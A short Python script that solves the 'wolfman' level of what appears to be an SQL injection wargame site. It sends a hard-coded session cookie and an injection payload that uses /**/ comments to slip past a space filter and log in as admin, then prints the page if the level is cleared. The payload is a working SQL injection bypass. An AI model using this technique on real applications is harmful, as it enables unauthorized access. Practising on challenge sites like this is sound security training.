import requests
headers= {'Cookie':'PHPSESSID=ilbihpsvjpl9h779141vl0ve8f'}
url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27/**/or/**/id=%27admin%27;%23"
r = requests.get(url, headers=headers).text
if "<h2>WOLFMAN Clear!</h2>" in r:
    print(r)